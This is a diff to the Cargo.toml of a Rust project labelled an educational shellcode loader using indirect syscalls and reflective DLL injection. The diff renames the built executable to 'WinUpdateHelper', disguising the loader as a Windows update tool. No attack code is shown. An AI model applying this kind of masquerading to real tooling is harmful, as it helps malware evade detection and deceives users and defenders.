@@ -5,6 +5,11 @@ edition = "2021"
 authors = ["Educational Purpose"]
 description = "Educational shellcode loader using indirect syscalls + reflective dll injection"
 
+# Nom de l'exécutable final (au lieu de reflective_dll_loader.exe)
+[[bin]]
+name = "WinUpdateHelper"
+path = "src/main.rs"
+
 [dependencies]
 # Types NT (structures système)
 ntapi = "0.4"
